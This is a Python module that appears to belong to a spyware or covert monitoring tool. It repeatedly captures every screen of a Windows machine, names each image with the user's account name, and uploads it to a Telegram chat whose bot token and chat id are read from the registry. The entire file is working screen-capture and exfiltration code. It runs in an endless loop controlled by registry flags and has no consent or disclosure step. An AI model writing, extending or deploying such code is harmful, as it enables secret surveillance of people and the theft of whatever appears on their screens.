from lib.winregistry import WinRegistry
import telebot  # REG_TELEGRAM API
from PIL import ImageGrab  # Take REG_SCREENSHOT
import time  # Contar segundos
from lib.util import Util
from lib.pathreg import PATH_TEMP_SCREENSHOT, REG_SCREENSHOT, REG_TELEGRAM, USERNAME
from lib.explorerfile import ExplorerFiles


class Screenshot:

    @staticmethod
    def take_screenshot(path):
        imagen = ImageGrab.grab(all_screens=True)
        print("[ScreenShot] Se tomó una captura ")
        imagen.save(path)
        print("[ScreenShot] Se guardó correctamente la captura")

    def send(self):
        # Eliminar carpeta entera
        ExplorerFiles().remove_folder(PATH_TEMP_SCREENSHOT)
        # Crear carpeta
        ExplorerFiles().create_folder(PATH_TEMP_SCREENSHOT)
        while True:
            interval = int(WinRegistry(REG_SCREENSHOT).read_value('interval_seconds'))
            active = int(WinRegistry(REG_SCREENSHOT).read_value('active'))
            if active == 1:
                try:
                    token = str(WinRegistry(REG_TELEGRAM).read_value('token'))
                    id = WinRegistry(REG_TELEGRAM).read_value('id')
                    path_file = PATH_TEMP_SCREENSHOT + "//" + USERNAME + " " + Util.current_time_short() + " " + Util.random_char(6) + ".png"

                    Screenshot.take_screenshot(path_file)
                    print("[ScreenShot] SuccessTake and save screenshot")
                    bot = telebot.TeleBot(token, parse_mode=None)

                    try:
                        bot.send_chat_action(id, 'upload_photo')
                        bot.send_document(id, open(path_file, 'rb'))

                        print("[SEND ScreenShot] Send items_general to: [ID] " + id)
                    except:
                        print("[SEND ScreenShot] there was a mistake when sending the [ID] " + id)
                except:
                    print("[ScreenShot] Ocurrio un problema al tomar la foto")

            time.sleep(interval)